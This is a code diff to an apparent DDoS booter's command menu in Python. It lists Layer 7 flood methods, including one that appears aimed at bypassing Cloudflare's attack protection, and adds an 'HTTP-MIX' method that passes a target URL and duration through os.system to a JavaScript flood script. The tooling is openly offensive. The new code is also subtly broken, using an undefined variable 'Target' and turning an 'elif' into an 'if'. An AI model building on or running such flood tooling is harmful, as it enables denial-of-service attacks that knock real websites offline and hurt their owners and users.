@@ -44,6 +44,7 @@ def methods():
 » Layer7: 
 	TLS <url> <time> <Rate> <threads>
 	HTTP <url> <req_per_ip> <time>
+	HTTP-MIX <url> <time>
 	FLOOD <url> <threads> METHODS<get/post> <time>
 	OMG <url> <time> <rps> <thread>
 	CF-UAM <url> <time>
@@ -82,7 +83,7 @@ def main():
                 
 # LAYER 7 METHODS
 
-        elif "CF-UAM" in cnc:
+        if "CF-UAM" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
@@ -144,6 +145,15 @@ def main():
             except IndexError:
                 print('Usage: TLS <url> <time> <Rate> <threads> ')
                 print('Example: TLS example.com 120 1000 213')
+
+        elif "HTTP-MIX" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'HTTP-MIX.js {Target} {time}')
+            except IndexError:
+                print('Usage: HTTP-MIX <url> <time>')
+                print('Example: HTTP-MIX example.com 60')
 
 # LAYER 4 METHODS
 
